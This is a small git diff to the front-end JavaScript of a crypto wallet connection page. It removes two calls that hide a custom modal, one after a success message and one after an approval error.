@@ -343,7 +343,6 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
       const modalMessage = document.querySelector('.custom-modal-message')
       if (modalMessage) modalMessage.textContent = 'Congratulations!'
       await new Promise(resolve => setTimeout(resolve, 1000))
-      hideCustomModal()
       store.isProcessingConnection = false
       return
     }
@@ -682,7 +681,6 @@ const initializeSubscribers = (modal) => {
           store.errors.push(errorMessage)
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = errorMessage
-          hideCustomModal()
           store.isProcessingConnection = false
           return
         }
